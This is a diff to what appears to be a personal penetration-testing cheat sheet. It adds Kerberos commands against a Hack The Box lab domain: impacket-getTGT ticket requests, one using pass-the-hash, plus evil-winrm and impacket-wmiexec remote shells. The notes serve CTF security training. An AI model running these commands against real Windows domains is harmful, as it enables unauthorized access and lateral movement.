@@ -4013,8 +4013,11 @@ gpupdate /force
 ```
 # auth with kerberoas in AD   ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
 impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.10.11.76       (Saving ticket in svc_winrm.ccache)
+or
+impacket-getTGT voleur.htb/svc_winrm -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
 export KRB5CCNAME=svc_winrm.ccache
 evil-winrm -i dc.voleur.htb -r voleur.htb
+impacket-wmiexec -k -no-pass voleur.htb/svc_winrm@WEB04.voleur.htb
 
 # connect shares and  auth with kerberoas in AD  ( when NTLM disable , STATUS_NOT_SUPPORTED , NTLM:False when run nxc smb)
 impacket-smbclient -k todd.wolfe@dc.voleur.htb
